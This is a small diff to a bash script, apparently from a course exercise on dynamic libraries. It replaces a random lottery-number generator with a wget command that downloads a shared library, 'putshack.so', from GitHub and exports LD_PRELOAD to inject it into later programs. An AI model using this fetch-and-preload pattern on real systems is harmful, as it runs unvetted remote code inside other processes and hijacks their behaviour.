@@ -1,3 +1,3 @@
 #!/bin/bash
-result=($(shuf -i 1-75 -n 5; shuf -i 1-15 -n 1))
-echo "${result[@]}"
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
